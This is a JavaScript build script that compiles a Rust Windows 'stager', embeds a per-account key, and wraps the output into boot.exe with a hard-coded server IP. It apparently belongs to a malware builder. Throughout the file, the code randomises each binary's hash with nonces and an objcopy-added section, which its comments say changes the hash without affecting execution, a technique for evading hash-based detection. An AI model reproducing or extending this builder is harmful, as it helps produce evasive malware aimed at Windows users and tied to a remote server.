// language: JavaScript, file: builder/rustbuild.js
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { compileLauncher, randomBuildMeta } from './compile.js';

const execFileP = promisify(execFile);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT_DIR  = path.join(__dirname, '..');
const DOWNLOAD_DIR = path.join(ROOT_DIR, 'download');

export async function buildBoot({ key, buildId }) {
  let rustDir = path.join(ROOT_DIR, 'client');
  if (!fs.existsSync(rustDir)) rustDir = ROOT_DIR;

  const srcDir = path.join(rustDir, 'src');
  if (!fs.existsSync(srcDir)) fs.mkdirSync(srcDir, { recursive: true });

  // per-build nonce in embedded_key.rs — changes st.exe content every build
  const nonce = crypto.randomBytes(16);
  const nonceArr = Array.from(nonce).map(b => b.toString(16).padStart(2, '0')).join(', ');
  const embeddedKeyPath = path.join(srcDir, 'embedded_key.rs');
  fs.writeFileSync(embeddedKeyPath, [
    '// Auto-generated per build — do not edit',
    `pub const ACCOUNT_KEY: &str = "${key}";`,
    '',
    '// Random per-build bytes — changes st.exe hash every build',
    '#[used]',
    '#[no_mangle]',
    '#[link_section = ".rdata"]',
    `pub static BUILD_NONCE: [u8; 16] = [${nonceArr}];`,
    '',
  ].join('\n'));

  console.log('[build] compiling rust stager...');
  try {
    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
      cwd: rustDir,
      timeout: 5 * 60_000,
      maxBuffer: 64 * 1024 * 1024,
    });
  } catch (e) {
    const fullLog = (e.stdout || '') + '\n' + (e.stderr || '');
    throw new Error(`cargo failed:\n${fullLog.slice(-2000)}`);
  }

  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
  if (!fs.existsSync(baseExe)) throw new Error(`rust build missing output at ${baseExe}`);

  if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });

  // Per-build uniquify st.exe via objcopy — adds a .buildmeta note section
  // with 64 random bytes. Changes hash, doesn't affect execution.
  const stFinal = path.join(DOWNLOAD_DIR, 'st.exe');
  const stUnique = path.join(DOWNLOAD_DIR, `st_${buildId}_${Date.now()}.exe`);
  const notePath = path.join(rustDir, '.build_note.bin');
  fs.writeFileSync(notePath, crypto.randomBytes(64));

  let objcopyOk = false;
  try {
    await execFileP('x86_64-w64-mingw32-objcopy', [
      '--add-section', `.buildmeta=${notePath}`,
      '--set-section-flags', '.buildmeta=readonly,data',
      baseExe, stUnique,
    ], { timeout: 30_000 });
    objcopyOk = true;
  } catch (e) {
    console.warn('[build] objcopy failed, falling back to plain copy:', e.message);
  }
  try { fs.unlinkSync(notePath); } catch {}

  if (objcopyOk) {
    fs.copyFileSync(stUnique, stFinal);
  } else {
    fs.copyFileSync(baseExe, stFinal);
  }
  try { fs.unlinkSync(stUnique); } catch {}

  console.log('[build] wrapping into boot.exe...');
  const bootBuf = await compileLauncher({
    key,
    buildId,
    config: { ip: process.env.SERVER_IP || '95.182.96.216' },
    baseExe,
  });
  return bootBuf;
}